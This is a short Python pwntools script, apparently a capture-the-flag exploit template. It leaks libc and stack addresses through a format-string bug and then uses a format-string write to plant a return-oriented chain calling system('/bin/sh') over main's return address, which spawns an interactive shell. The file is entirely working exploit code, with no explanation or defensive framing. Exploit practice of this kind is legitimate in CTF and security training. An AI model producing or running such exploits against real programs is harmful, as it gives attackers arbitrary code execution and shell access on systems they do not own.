from pwn import *

FILENAME = ""
OFFSET = 0

exe = ELF(f"./{FILENAME}")
libc = ELF("./libc-2.31.so")
# ld = ELF("./ld-2.31.so")

context.binary = exe

p = process([exe.path])
#gdb.attach(p)

# leak stuff 
p.sendline(b"libc= %71$p, stack= %72$p")
p.recvuntil(b"libc=")
leaked_libc = int(p.recvuntil(b",").strip(b",").decode(), 16)
p.recvuntil(b"stack=")
leaked_stack = int(p.recvline().strip().decode(), 16)

libc.address = leaked_libc - (0x7ff1f3d9ed0a - 0x7ff1f3d7b000) # subtract constant offset to libc base
ret_ptr_main = leaked_stack - (0x7ffc21ff0b68 - 0x7ffc21ff0a78) # offset til ADRESSEN som holder return pointer fra main

pop_rsi = libc.address + 0x2590f
pop_r12 = libc.address + 0x23e9a

pop_rdi_ret = libc.address + 0x23796
ret = libc.address + 0x2235f
libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]

writes_binsh = {
    ret_ptr_main: pop_rdi_ret,
    ret_ptr_main+0x8: binsh,
    ret_ptr_main+0x10: ret,
    ret_ptr_main+0x18: libc_system,
}

second_payload = fmtstr_payload(6, writes_binsh)
log.info(f"{second_payload = }")

p.recvuntil(b"post?")
p.sendline(second_payload)

p.interactive()